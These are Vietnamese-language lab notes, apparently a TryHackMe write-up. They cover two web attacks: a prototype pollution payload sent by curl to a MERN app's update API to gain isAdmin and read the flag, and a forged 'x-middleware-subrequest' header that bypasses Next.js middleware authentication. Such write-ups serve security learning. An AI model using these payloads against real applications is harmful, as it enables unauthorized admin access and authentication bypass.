# 2- thực hành bài 2 : Mern stack
### đầu tiên là recon
```shell-session
curl -I 10.49.132.56:3000/
```
![[Pasted image 20260816204314.png]]ok ta có thể thấy như này: dựa vào lý thuyết thì có thể thấy nó sử dụng express
### khai thác
-vì cái bài lab nó nói rõ rành rành việc lỗi nằm ở hàm merge cái data gửi vô json, thì cái hàm đấy nó sẽ gộp bất chấp targert.thuộc tính === source. thuộc tính
-target là object trên server, còn source là object dạng json mà người dùng gửi lên để update data
-bây giờ ta sẽ dùng api update để gửi payload lên server
```shell
root@tryhackme:~# curl -b cookies.txt -X POST http://10.49.132.56:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
{"status":"updated"}
```

-bây giờ tài khoản nào cũng có thuộc tính `__proto__` có isAdmin == true. Cái api check flag của cái hệ thống này thiết kế có sơ hở nữa, nó check thuộc tính admin=true, mà người dùng thường làm j có thuộc tính admin, nên nó nhảy xuống thuộc tính `__proto__`  rồi, ![[Pasted image 20260816210010.png]]-truy cập cái api/flag để lấy cờ thôi

# 2- thực hành bài 3: react/next js
Phần này thực tế là tận dụng sơ hở của middleware là người dùng có thể thêm header *x-middleware-subrequest* mà thằng middleware tin tưởng và cứ thế bỏ qua request ko kiểm tra nữa
```shell
root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.49.132.56:3001/dashboard
```
 -kết quả là requesst tới /dashboard nó ko bị redirect tới /login
 ![[Pasted image 20260816211453.png]]
